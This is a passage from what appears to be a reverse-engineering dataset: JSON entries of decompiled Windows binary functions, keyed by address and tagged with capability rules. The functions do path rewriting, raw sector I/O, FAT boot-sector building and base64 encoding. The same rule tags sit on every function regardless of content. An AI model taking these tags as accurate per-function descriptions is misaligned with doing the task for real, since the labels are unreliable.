puVar3 = *0xb1c5b3c0 + 0x208;\n        *0xb1c59f48 = *0xb1c5b3c0;\n        fcn.0002bd30(*0xb1c5b3c0, 0x104);\n        fcn.0002bd60(*0xb1c59f5c, 0x104);\n        fcn.0002bca0(puVar3, 0x104);\n        fcn.000785aa(*0xb1c59f50, 0xb1bde644, puVar3);\n        fcn.0002bcd0(puVar3, 0x104);\n        fcn.000785aa(*0xb1c59f3c, 0xb1bde644, puVar3);\n        var_44h = *0xb1c59f48;\n        do {\n            uVar5 = *var_44h;\n            var_44h = var_44h + 2;\n        } while (uVar5 != 0);\n        *0xb1c59f40 = (var_44h - (*0xb1c59f48 + 2) >> 1) << 1;\n        var_54h = *0xb1c59f5c;\n        do {\n            uVar5 = *var_54h;\n            var_54h = var_54h + 2;\n        } while (uVar5 != 0);\n        *0xb1c59f44 = (var_54h - (*0xb1c59f5c + 2) >> 1) << 1;\n        var_64h = *0xb1c59f50;\n        do {\n            uVar5 = *var_64h;\n            var_64h = var_64h + 2;\n        } while (uVar5 != 0);\n        *0xb1c59f54 = (var_64h - (*0xb1c59f50 + 2) >> 1) << 1;\n        var_74h = *0xb1c59f3c;\n        do {\n            uVar5 = *var_74h;\n            var_74h = var_74h + 2;\n        } while (uVar5 != 0);\n        uVar2 = (var_74h - (*0xb1c59f3c + 2) >> 1) << 1;\n        *0xb1c59f4c = uVar2;\n    }\n    *var_14h = 0;\n    var_4h = 0;\n    if (var_8h == NULL) {\n        uVar2 = uVar2 & 0xffffff00;\n        goto code_r0x000334c5;\n    }\n    if (var_ch != '\\0') {\n        uVar2 = (**0xb1bde2e0)(var_8h, 0x18, 4);\n    }\n    if (*var_8h == 0x18) {\n        uVar2 = var_8h[3] & 0xfffff80d;\n        if (uVar2 == 0) {\n            puVar3 = var_8h[2];\n            if (puVar3 == NULL) {\n                uVar2 = var_8h[3] & 0xfffff800;\n                goto code_r0x000334c5;\n            }\n            if (var_ch == '\\0') {\n                uVar1 = puVar3[1];\n                *var_10h_2 = *puVar3;\n                var_10h_2[1] = uVar1;\n            }\n            else {\n                if (puVar3 < **0xb1bde184) {\n                    var_40h = *puVar3;\n                    var_3ch = puVar3[1];\n                }\n                else {\n                    var_40h = ***0xb1bde184;\n                    var_3ch = (**0xb1bde184)[1];\n                }\n                *var_10h_2 = var_40h;\n                var_10h_2[1] = var_3ch;\n                (**0xb1bde2e0)(var_10h_2[1], *var_10h_2, 2);\n            }\n            uVar5 = *var_10h_2;\n            puVar3 = var_10h_2;\n            if (((uVar5 & 1) != 0) || (puVar3 = uVar5,  puVar3 == 0xfffe)) {\n                uVar2 = puVar3 & 0xffffff00;\n                goto code_r0x000334c5;\n            }\n            if ((uVar5 == *0xb1c59f40) ||\n               ((*0xb1c59f40 < uVar5 && (puVar3 = *(var_10h_2[1] + (*0xb1c59f40 & 0xfffffffe)),  puVar3 == 0x5c)))) {\n                puVar3 = fcn.00036010(var_10h_2[1], *0xb1c59f48, *0xb1c59f40 >> 1);\n                if (puVar3 != NULL) goto code_r0x00033262;\n                var_28h = *0xb1c59f40;\n                var_34h = *0xb1c59f48;\n                var_19h._0_1_ = 1;\n                puVar3 = *0xb1c59f48;\n            }\n            else {\ncode_r0x00033262:\n                if ((uVar5 == *0xb1c59f44) ||\n                   ((*0xb1c59f44 < uVar5 && (puVar3 = *(var_10h_2[1] + (*0xb1c59f44 & 0xfffffffe)),  puVar3 == 0x5c))))\n                {\n                    puVar3 = fcn.00036010(var_10h_2[1], *0xb1c59f5c, *0xb1c59f44 >> 1);\n                    if (puVar3 == NULL) {\n                        var_28h = *0xb1c59f44;\n                        var_34h = *0xb1c59f5c;\n                        var_19h._0_1_ = 1;\n                        puVar3 = *0xb1c59f5c;\n                        goto code_r0x0003339b;\n                    }\n                }\n                if ((uVar5 == *0xb1c59f54) ||\n                   ((*0xb1c59f54 < uVar5 && (puVar3 = *(var_10h_2[1] + (*0xb1c59f54 & 0xfffffffe)),  puVar3 == 0x5c))))\n                {\n                    puVar3 = fcn.00036010(var_10h_2[1], *0xb1c59f50, *0xb1c59f54 >> 1);\n                    if (puVar3 == NULL) {\n                        var_28h = *0xb1c59f54;\n                        var_34h = *0xb1c59f48;\n                        var_19h._0_1_ = 1;\n                        puVar3 = *0xb1c59f48;\n                        goto code_r0x0003339b;\n                    }\n                }\n                if ((uVar5 == *0xb1c59f4c) ||\n                   ((*0xb1c59f4c < uVar5 && (puVar3 = *(var_10h_2[1] + (*0xb1c59f4c & 0xfffffffe)),  puVar3 == 0x5c))))\n                {\n                    puVar3 = fcn.00036010(var_10h_2[1], *0xb1c59f3c, *0xb1c59f4c >> 1);\n                    if (puVar3 == NULL) {\n                        var_28h = *0xb1c59f4c;\n                        var_34h = *0xb1c59f5c;\n                        var_19h._0_1_ = 1;\n                        puVar3 = *0xb1c59f5c;\n                    }\n                }\n            }\ncode_r0x0003339b:\n            if (var_19h != 0) {\n                var_88h = var_34h;\n                do {\n                    uVar5 = *var_88h;\n                    var_88h = var_88h + 2;\n                } while (uVar5 != 0);\n                var_94h._0_2_ = var_88h - (var_34h + 2) >> 1;\n                uVar5 = var_94h * 2;\n                *var_10h_2 = (*var_10h_2 - var_28h) + uVar5;\n                *(var_10h_2 + 2) = *var_10h_2;\n                iVar4 = fcn.00035200(*(var_10h_2 + 2));\n                if (iVar4 == 0) {\n                    *var_14h = 0xc000009a;\n                    uVar2 = var_19h;\n                    goto code_r0x000334c5;\n                }\n                fcn.0007877e(iVar4, var_34h, uVar5);\n                fcn.0007877e(uVar5 + iVar4, var_10h_2[1] + var_28h, *var_10h_2 - uVar5);\n                var_10h_2[1] = iVar4;\n                puVar3 = var_10h_2;\n            }\n            uVar2 = puVar3 & 0xffffff00 | var_19h;\n            goto code_r0x000334c5;\n        }\n    }\n    uVar2 = uVar2 & 0xffffff00;\ncode_r0x000334c5:\n    *in_FS_OFFSET = var_10h;\n    return uVar2;\n}\n",
        "token_count": 2823
    },
    "00033500": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint fcn.00033500(void)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    while ((iVar1 = (**0xb1bde30c)(0xb1c5b3a8, 0, 0, 0, 0),  iVar1 == 0 && (*0xb1c5b346 == '\\0'))) {\n        while (iVar1 = (**0xb1bde180)(),  iVar1 != 0) {\n            uVar2 = fcn.00033580(iVar1 + -0x58);\n            *(iVar1 + -0x40) = uVar2;\n            (**0xb1bde2ec)();\n        }\n    }\n    return 0;\n}\n",
        "token_count": 179
    },
    "00033580": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00033580(int32_t arg_8h)\n\n{\n    char cVar1;\n    int64_t iVar2;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    int32_t var_34h;\n    uint32_t var_30h;\n    int32_t var_2ch;\n    uint var_28h;\n    char *var_24h;\n    uint32_t var_20h;\n    uint32_t var_1ch;\n    int32_t var_18h;\n    uint var_14h;\n    uint32_t var_ch;\n    uint var_8h;\n    \n    var_24h = *(arg_8h + 0x60);\n    if (*(arg_8h + 0x24) == '\\0') {\n        var_1ch = *(var_24h + 0x14) != *0xb1c5b398;\n        if (*(arg_8h + 4) == 0) {\n            var_28h = 0xc0000001;\n        }\n        else {\n            if ((*(*(arg_8h + 4) + 6) & 5) == 0) {\n                var_34h = (**0xb1bde0e0)(*(arg_8h + 4), 0, 1, 0, 0, 0x10);\n            }\n            else {\n                var_34h = *(*(arg_8h + 4) + 0xc);\n            }\n            var_2ch = var_34h;\n            if (var_34h == 0) {\n                var_28h = 0xc000009a;\n            }\n            else {\n                if (*var_24h == '\\x03') {\n                    var_18h = *(var_24h + 0xc);\n                    var_14h = *(var_24h + 0x10);\n                    var_20h = *(var_24h + 4);\n                    iVar2 = fcn.00078796(var_18h, var_14h, 0x200, 0);\n                    if ((iVar2 != 0) || (var_20h % 0x200 != 0)) {\n                        return 0xc000000d;\n                    }\n                    var_ch = 0;\n                    while ((var_ch < var_20h &&\n                           (cVar1 = fcn.00033860(var_1ch, var_2ch + var_ch, var_18h + var_ch),  cVar1 != '\\0'))) {\n                        var_ch = var_ch + 0x200;\n                    }\n                    *(arg_8h + 0x1c) = var_ch;\n                }\n                else {\n                    var_18h = *(var_24h + 0xc);\n                    var_14h = *(var_24h + 0x10);\n                    var_30h = *(var_24h + 4);\n                    iVar2 = fcn.00078796(var_18h, var_14h, 0x200, 0);\n                    if ((iVar2 != 0) || (var_30h % 0x200 != 0)) {\n                        return 0xc000000d;\n                    }\n                    var_ch = 0;\n                    while ((var_ch < var_30h &&\n                           (cVar1 = fcn.000337b0(var_1ch, var_2ch + var_ch, var_18h + var_ch),  cVar1 != '\\0'))) {\n                        var_ch = var_ch + 0x200;\n                    }\n                    var_2ch = *(var_1ch * 4 + -0x4e3a4c84) + var_18h;\n                    fcn.00078682(0xffffffff, &var_2ch, &var_30h, &var_8h);\n                    *(arg_8h + 0x1c) = var_ch;\n                }\n                var_28h = 0;\n            }\n        }\n    }\n    else {\n        var_28h = 0xc0000120;\n    }\n    return var_28h;\n}\n",
        "token_count": 912
    },
    "00033970": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00033970(int32_t arg_8h)\n\n{\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    int32_t var_18h;\n    uint var_14h;\n    \n    var_18h = fcn.00078694(&var_14h, 1);\n    if (var_18h == 0) {\n        var_1ch = 0x1f01ff;\n        var_28h = 0x120089;\n        var_24h = 0x120116;\n        var_20h = 0x1200a0;\n        var_2ch = 4;\n        var_18h = (**0xb1bde190)(arg_8h, &var_2ch, &var_14h, arg_8h + 0x98, 1, &var_28h);\n    }\n    return var_18h;\n}\n",
        "token_count": 227
    },
    "000339e0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl fcn.000339e0(uint noname_0, uchar *arg_ch)\n\n{\n    uint var_300h;\n    uint var_fah;\n    int32_t var_f4h;\n    uint var_f0h;\n    uint var_ech;\n    uint *var_e8h;\n    uint var_e4h;\n    uint var_e0h;\n    uint var_dch;\n    uint var_d8h;\n    uint var_d4h;\n    uint var_cch;\n    uint var_c4h;\n    uint var_c0h;\n    uint var_68h;\n    uint var_64h;\n    uint var_60h;\n    int32_t var_5ch;\n    uint var_58h;\n    \n    fcn.0002bfa0(&var_c0h, 0x52);\n    fcn.0002bf70(&var_58h, 0x52);\n    fcn.00078556(&var_300h, 0x104, 0xb1be1770, &var_c0h, &var_58h);\n    var_fah._0_2_ = 0;\n    fcn.00078550(&var_cch, &var_300h);\n    var_f0h = 0x18;\n    var_ech = 0;\n    var_e4h = 0x40;\n    var_e8h = &var_cch;\n    var_e0h = 0;\n    var_dch = 0;\n    var_d8h = 0x6400000;\n    var_d4h = 0;\n    var_f4h = fcn.0001ec90(0xb1c59f58, 3, &var_f0h, &var_60h, &var_d8h, 0x80, 0, 3, 0x868, 0, 0);\n    if (var_f4h == 0) {\n        *(*0xb1c59660 + 0x18) = *0xb1c59f58;\n        if ((var_5ch == 2) || (var_5ch == 3)) {\n            var_68h = var_d8h;\n            var_64h = var_d4h;\n            var_f4h = fcn.0007855c(*0xb1c59f58, &var_60h, &var_68h, 8, 0x14);\n            if (var_f4h != 0) goto code_r0x00033c02;\n            *arg_ch = 1;\n        }\n        else {\n            *arg_ch = 0;\n        }\n        var_f0h = 0x18;\n        var_ech = 0;\n        var_e4h = 0;\n        var_e8h = NULL;\n        var_e0h = 0;\n        var_dch = 0;\n        var_f4h = fcn.0007868e();\n        if (var_f4h == 0) {\n            var_c4h = 0;\n            var_f4h = fcn.0007867c();\n            if (var_f4h == 0) {\n                *0xb1c5b388 = var_c4h;\n                *0xb1c5b38c = 0;\n            }\n        }\n    }\ncode_r0x00033c02:\n    if (var_f4h != 0) {\n        if (*0xb1c5b37c != 0) {\n            fcn.00078688(0xffffffff, *0xb1c5b37c);\n            *0xb1c5b37c = 0;\n        }\n        if (*0xb1c5b374 != 0) {\n            fcn.00078544(*0xb1c5b374);\n            *0xb1c5b374 = 0;\n        }\n        fcn.00078544(*0xb1c59f58);\n        *0xb1c59f58 = 0;\n    }\n    return var_f4h;\n}\n",
        "token_count": 897
    },
    "00033cc0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl\nfcn.00033cc0(uint arg_8h, uint noname_1, int32_t arg_10h, int32_t arg_14h, int32_t arg_18h, uint32_t arg_1ch)\n\n{\n    uchar uVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    uint *puVar5;\n    uint var_58h;\n    uint var_4dh;\n    uchar var_49h;\n    uchar var_48h;\n    uchar var_47h;\n    uchar var_46h;\n    uchar var_45h;\n    uchar var_44h;\n    uchar var_43h;\n    uchar var_42h;\n    uchar var_41h;\n    uchar var_40h;\n    uchar var_3fh;\n    uchar var_3eh;\n    uchar var_3dh;\n    uchar var_3ch;\n    uchar var_3bh;\n    uchar var_3ah;\n    uchar var_39h;\n    uchar var_38h;\n    uchar var_37h;\n    uchar var_36h;\n    uchar var_35h;\n    uint var_34h;\n    uchar var_30h;\n    uchar var_2fh;\n    uchar var_2eh;\n    uint var_2dh;\n    uint var_29h;\n    uint var_25h;\n    uint var_1eh;\n    uint32_t var_18h;\n    uint *var_14h;\n    uint32_t var_10h;\n    uint32_t var_ch;\n    uint32_t var_8h;\n    uint32_t var_4h;\n    \n    var_14h = fcn.00035200(arg_1ch);\n    if (var_14h == NULL) {\n        uVar2 = 0;\n    }\n    else {\n        fcn.00078790(&var_58h, 0, 0x3e);\n        var_58h._0_1_ = 0xeb;\n        var_4dh._0_1_ = arg_1ch;\n        var_4dh._1_1_ = arg_1ch >> 8;\n        iVar3 = arg_18h * arg_14h * arg_10h;\n        var_10h = iVar3 - 1;\n        if (var_10h < 0xfff6) {\n            var_18h = 1;\n        }\n        else if (var_10h / 0xfff5 < 0x100) {\n            var_18h = var_10h / 0xfff5;\n            if (var_10h % 0xfff5 != 0) {\n                var_18h = var_18h + 1;\n            }\n        }\n        else {\n            var_18h = 0xff;\n        }\n        var_4dh._2_1_ = var_18h;\n        var_4dh._3_1_ = 2;\n        var_49h = 0;\n        var_8h = var_10h / (var_18h & 0xff);\n        var_48h = 2;\n        var_47h = 0;\n        var_46h = 2;\n        uVar1 = var_10h >> 8;\n        if (var_10h < 0x10000) {\n            var_45h = var_10h;\n            var_44h = uVar1;\n        }\n        var_43h = 0xf8;\n        var_ch = (((iVar3 + -3) - 0x4000 / arg_1ch) * 2) / (var_18h * arg_1ch + 4);\n        if ((((iVar3 + -3) - 0x4000 / arg_1ch) * 2) % (var_18h * arg_1ch + 4) != 0) {\n            var_ch = var_ch + 1;\n        }\n        var_42h = var_ch;\n        var_41h = var_ch >> 8;\n        var_40h = arg_18h;\n        var_3fh = arg_18h >> 8;\n        var_3eh = arg_10h;\n        var_3dh = arg_10h >> 8;\n        var_3ch = 1;\n        var_3bh = 0;\n        var_3ah = 0;\n        var_39h = 0;\n        if (0xffff < var_10h) {\n            var_36h = var_10h >> 0x10;\n            var_35h = var_10h >> 0x18;\n            var_38h = var_10h;\n            var_37h = uVar1;\n        }\n        var_34h._0_1_ = 0x80;\n        var_34h._2_1_ = 0x29;\n        var_34h._3_1_ = 0xe8;\n        var_30h = 0x99;\n        var_2fh = 0x9b;\n        var_2eh = 0xba;\n        var_2dh = *0xb1be1794;\n        var_29h = *0xb1be1798;\n        var_25h._0_2_ = *0xb1be179c;\n        var_25h._2_1_ = *0xb1be179e;\n        stack0xffffffda = *0xb1be17a0;\n        var_1eh = *0xb1be17a4;\n        fcn.00078790(var_14h, 0, arg_1ch);\n        puVar4 = &var_58h;\n        puVar5 = var_14h;\n        for (iVar3 = 0xf; iVar3 != 0; iVar3 = iVar3 + -1) {\n            *puVar5 = *puVar4;\n            puVar4 = puVar4 + 1;\n            puVar5 = puVar5 + 1;\n        }\n        *puVar5 = *puVar4;\n        fcn.000337b0(arg_8h, var_14h, 0);\n        fcn.00078790(var_14h, 0, arg_1ch);\n        for (var_4h = 0; var_4h < var_ch << 1; var_4h = var_4h + 1) {\n            fcn.000337b0(arg_8h, var_14h, var_4h * arg_1ch + arg_1ch * 2);\n        }\n        *var_14h = 0xf8;\n        *(var_14h + 1) = 0xff;\n        *(var_14h + 2) = 0xff;\n        *(var_14h + 3) = 0xff;\n        fcn.000337b0(arg_8h, var_14h, arg_1ch << 1);\n        fcn.000337b0(arg_8h, var_14h, var_ch * arg_1ch + arg_1ch * 2);\n        fcn.00035330(var_14h);\n        uVar2 = 1;\n    }\n    return uVar2;\n}\n",
        "token_count": 1598
    },
    "00033ff0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nbool __cdecl fcn.00033ff0(int32_t *arg_8h)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.00035230(0x10);\n    *arg_8h = iVar1;\n    iVar1 = *arg_8h;\n    if (iVar1 != 0) {\n        (**0xb1bde0cc)(*arg_8h, 1, 0);\n    }\n    return iVar1 != 0;\n}\n",
        "token_count": 106
    },
    "00034030": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00034030(int32_t *arg_8h, uint noname_1, int32_t arg_10h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    \n    iVar1 = fcn.00035230(0x10);\n    *arg_8h = iVar1;\n    if (*arg_8h == 0) {\n        uVar2 = 0;\n    }\n    else {\n        if (arg_10h == 0) {\n            (**0xb1bde0cc)(*arg_8h, 1, 0);\n        }\n        else {\n            (**0xb1bde0cc)(*arg_8h, 0, 0);\n        }\n        uVar2 = 1;\n    }\n    return uVar2;\n}\n",
        "token_count": 176
    },
    "00034080": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00034080(int32_t *arg_8h)\n\n{\n    if (*arg_8h != 0) {\n        fcn.00035330(*arg_8h);\n        *arg_8h = 0;\n    }\n    return;\n}\n",
        "token_count": 61
    },
    "000340b0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.000340b0(int32_t *arg_8h)\n\n{\n    uint uVar1;\n    \n    if ((arg_8h == NULL) || (*arg_8h == 0)) {\n        uVar1 = 0;\n    }\n    else {\n        (**0xb1bde0c0)(*arg_8h, 0, 0);\n        uVar1 = 1;\n    }\n    return uVar1;\n}\n",
        "token_count": 101
    },
    "000340e0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.000340e0(int32_t *arg_8h, int32_t arg_ch)\n\n{\n    int32_t iVar1;\n    uint arg_8h_00;\n    uint var_10h;\n    uint var_ch;\n    uint *var_8h;\n    int32_t var_4h;\n    \n    if ((arg_8h == NULL) || (*arg_8h == 0)) {\n        iVar1 = -1;\n    }\n    else {\n        if (arg_ch == -1) {\n            var_8h = NULL;\n        }\n        else {\n            _var_10h = fcn.00078778(arg_ch, arg_ch >> 0x1f, 0xffffd8f0, 0xffffffff);\n            var_8h = &var_10h;\n        }\n        var_4h = (**0xb1bde30c)(*arg_8h, 0, 0, 0, var_8h);\n        if (var_4h == 0) {\n            iVar1 = 1;\n        }\n        else {\n            arg_8h_00 = fcn.000785b6(var_4h);\n            fcn.000354e0(arg_8h_00);\n            iVar1 = -(var_4h != 0x102);\n        }\n    }\n    return iVar1;\n}\n",
        "token_count": 300
    },
    "00034170": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl fcn.00034170(int32_t arg_8h, int32_t arg_ch, int32_t arg_10h)\n\n{\n    bool bVar1;\n    uint var_64h;\n    int32_t var_60h;\n    int32_t var_5ch;\n    uint var_58h;\n    char acStack66 [26];\n    char acStack40 [10];\n    uint var_1ah;\n    int32_t var_10h;\n    int32_t var_ch;\n    uint8_t var_8h [2];\n    uint var_6h;\n    \n    var_60h = 0;\n    var_5ch = 0;\n    bVar1 = false;\n    for (var_10h = 0; var_10h < 0x1a; var_10h = var_10h + 1) {\n        *(&var_58h + var_10h) = var_10h + 'A';\n        acStack66[var_10h] = var_10h + 'a';\n    }\n    for (var_10h = 0; var_10h < 10; var_10h = var_10h + 1) {\n        acStack40[var_10h] = var_10h + '0';\n    }\n    var_1ah._0_1_ = 0x2b;\n    var_1ah._1_1_ = 0x2f;\n    do {\n        var_6h._0_1_ = 0;\n        var_8h[1] = 0;\n        var_8h[0] = 0;\n        var_ch = 0;\n        do {\n            if (2 < var_ch) goto code_r0x0003423f;\n            var_8h[var_ch] = *(arg_8h + var_60h);\n            var_ch = var_ch + 1;\n            var_60h = var_60h + 1;\n        } while (var_60h != arg_10h);\n        bVar1 = true;\ncode_r0x0003423f:\n        if (0 < var_ch) {\n            var_6h._2_2_ = CONCAT11(*(&var_58h + ((var_8h[0] & 3) << 4 | var_8h[1] >> 4)), \n                                    *(&var_58h + (var_8h[0] >> 2)));\n            stack0xfffffff8 = CONCAT12(*(&var_58h + ((var_8h[1] & 0xf) << 2 | var_6h >> 6)), var_6h._2_2_);\n            stack0xfffffff8 = CONCAT13(*(&var_58h + (var_6h & 0x3f)), stack0xfffffff8);\n            if ((var_ch < 3) && (stack0xfffffff8 = CONCAT13(0x3d, stack0xfffffff8),  var_ch < 2)) {\n                stack0xfffffff8 = CONCAT12(0x3d, var_6h._2_2_);\n                stack0xfffffff8 = CONCAT13(0x3d, stack0xfffffff8);\n            }\n        }\n        *(arg_ch + var_5ch) = stack0xfffffff8;\n        var_5ch = var_5ch + 4;\n        if (bVar1) {\n            *(arg_ch + var_5ch) = 0;\n            return var_5ch;\n        }\n    } while( true );\n}\n",
        "token_count": 792
    },
    "00034520": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00034520(int32_t *arg_8h)\n\n{\n    if ((arg_8h != NULL) && (*arg_8h != 0)) {\n        fcn.00035330(*arg_8h);\n        *arg_8h = 0;\n    }\n    return;\n}\n",
        "token_count": 70
    },
    "00034570": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nbool __cdecl fcn.00034570(int32_t *arg_8h)\n\n{\n    int32_t iVar1;\n    bool bVar2;\n    uint var_8h;\n    uint var_4h;\n    \n    if ((arg_8h == NULL) || (*arg_8h == 0)) {\n        bVar2 = false;\n    }\n    else {\n        var_8h = 0;\n        var_4h = 0;\n        iVar1 = (**0xb1bde30c)(*arg_8h, 0, 0, 0, &var_8h);\n        bVar2 = iVar1 == 0;\n    }\n    return bVar2;\n}\n",
        "token_count": 152
    },
    "000345e0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.000345e0(uint arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    int32_t var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint *var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    int32_t var_4h;\n    \n    var_30h = fcn.00036da0(&var_10h);\n    if (var_30h == 0) {\n        var_4h = var_30h;\n        iVar1 = fcn.000374c0(arg_ch);\n        iVar1 = fcn.00035200(iVar1 << 1);\n        if (iVar1 == 0) {\n            var_4h = -0x3fffff66;\n        }\n        else {\n            fcn.00037370(arg_ch, iVar1, 0xffffffff);\n            fcn.00078550(&var_ch, iVar1);\n            var_28h = 0x18;\n            var_24h = 0;\n            var_1ch = 0;\n            var_20h = &var_ch;\n            var_18h = var_10h;\n            var_14h = 0;\n            var_4h = fcn.00020190(arg_8h, 0x1f0001, &var_28h, 0);\n        }\n        fcn.00035330(iVar1);\n        fcn.00036f20(var_10h);\n        if (var_4h == 0) {\n            var_30h = 0;\n        }\n        else {\n            var_30h = fcn.000785b6(var_4h);\n        }\n    }\n    return var_30h;\n}\n",
        "token_count": 420
    },
    "000346d0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.000346d0(uint arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint uVar3;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint *var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    uint var_8h;\n    \n    uVar3 = 0;\n    uVar2 = arg_ch;\n    iVar1 = fcn.000374c0(arg_ch);\n    iVar1 = fcn.00035200(iVar1 << 1);\n    if (iVar1 == 0) {\n        uVar2 = fcn.000785b6(0xc000009a, uVar2, uVar3);\n    }\n    else {\n        fcn.00037370(arg_ch, iVar1, 0xffffffff);\n        fcn.00078550(&var_8h, iVar1);\n        var_24h = 0x18;\n        var_20h = 0;\n        var_18h = 0;\n        var_1ch = &var_8h;\n        var_14h = 0;\n        var_10h = 0;\n        var_ch = fcn.000201e0(arg_8h, 0x1f0001, &var_24h);\n        fcn.00035330(iVar1);\n        if (var_ch == 0) {\n            uVar2 = 0;\n        }\n        else {\n            uVar2 = fcn.000785b6(var_ch);\n        }\n    }\n    return uVar2;\n}\n",
        "token_count": 377
    },
    "000347f0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nbool __cdecl fcn.000347f0(uint *arg_8h)\n\n{\n    int32_t iVar1;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    var_10h = 0;\n    var_ch = 0;\n    iVar1 = fcn.000785ec(*arg_8h, 0, &var_10h);\n    return iVar1 == 0;\n}\n",
        "token_count": 96
    },
    "00034830": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
